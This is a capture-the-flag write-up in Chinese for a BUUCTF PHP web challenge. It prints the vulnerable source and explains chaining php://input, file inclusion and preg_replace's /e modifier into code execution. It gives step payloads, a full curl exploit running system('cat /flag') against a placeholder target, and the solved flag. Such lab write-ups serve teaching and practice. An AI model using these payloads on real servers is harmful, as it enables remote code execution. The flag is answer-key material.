---
title: "[BJDCTF2020]ZJCTF，不过如此"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [php-pseudo-protocol, preg_replace-rce, file-inclusion, code-execution]
vulnerability: preg_replace /e 修饰符导致代码执行
solved: true
flag: "flag{80470417-7914-46e3-921a-bc8f40dfde1f}"
---

# [BJDCTF2020]ZJCTF，不过如此

## 题目概述
一道 PHP 代码审计题，包含两个文件：`index.php` 和 `next.php`。需要绕过检查并利用 `preg_replace` 的 `/e` 修饰符漏洞执行代码。

## 信息收集

访问页面获取 `index.php` 源码：
```php
<?php
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }
    include($file);  //next.php
}
```

使用 `php://filter` 读取 `next.php`：
```php
<?php
function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}
foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}
function getFlag(){
    @eval($_GET['cmd']);
}
```

## 漏洞分析

### 漏洞类型
1. **PHP 伪协议绕过**：使用 `php://input` 让 `file_get_contents()` 返回指定内容
2. **preg_replace /e 代码执行**：PHP 5.x 中 `/e` 修饰符会执行替换字符串，配合 `${}` 复杂变量语法可执行任意代码

### 原理分析
- `preg_replace('/(' . $re . ')/ei', 'strtolower("\\1")', $str)` 中：
  - `/e` 修饰符使替换字符串作为 PHP 代码执行
  - `\\1` 是第一个捕获组的反向引用
  - 如果捕获组内容为 `${func()}`，PHP 会解析复杂变量语法并执行函数

### 判断过程
1. `index.php` 需要 `file_get_contents($text) === "I have a dream"`，可用 `php://input` 绕过
2. `$file` 不能包含 "flag"，但可以用 `php://filter` 读取源码或直接 include `next.php`
3. `next.php` 中 `preg_replace` 使用 `/e` 修饰符，存在代码执行漏洞

## 利用过程

### Step 1: 绕过 text 检查
```
text=php://input
POST: I have a dream
```

### Step 2: 包含 next.php
```
file=next.php
```

### Step 3: 触发 preg_replace /e 漏洞
利用 `\S+` 正则匹配非空白字符，配合 `${getFlag()}` 调用后门函数：
```
\S+=${getFlag()}
cmd=system('cat /flag');
```

### 完整 Payload
```bash
curl "http://target/?text=php://input&file=next.php&cmd=system('cat%20/flag');&%5CS%2B=%24%7BgetFlag%28%29%7D" \
  -d "I have a dream"
```

### 获取 Flag
```
flag{80470417-7914-46e3-921a-bc8f40dfde1f}
```

## 复现步骤
1. 访问题目，获取 `index.php` 源码
2. 使用 `php://filter` 读取 `next.php` 源码
3. 构造 payload：`text=php://input`, `file=next.php`, `\S+=${getFlag()}`, `cmd=system('cat /flag')`
4. POST 数据 `I have a dream`，获取 flag

## 技术总结

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| PHP 伪协议 | `file_get_contents($text)` | `php://input` + POST 数据 | php://input 可控制读取内容 |
| 文件包含 | `include($file)` | `file=next.php` | 无需伪协议直接包含 |
| 代码执行 | `preg_replace /e` | `\S+=${getFlag()}` | /e 修饰符 + 复杂变量语法 |

## 知识总结

### 解题技巧
1. 看到 `file_get_contents($var) === "string"` 立即想到 `php://input`
2. 看到 `preg_replace` + `/e` 修饰符立即想到代码执行
3. PHP 复杂变量语法 `${expr}` 会在字符串解析时执行 expr

### 同类题型套路
- **preg_replace /e 漏洞**：正则参数可控时，构造 `${func()}` 格式触发代码执行
- **PHP 伪协议**：`php://input` 控制读取内容，`php://filter` 读取源码
- **文件包含**：配合伪协议实现任意文件读取或代码执行
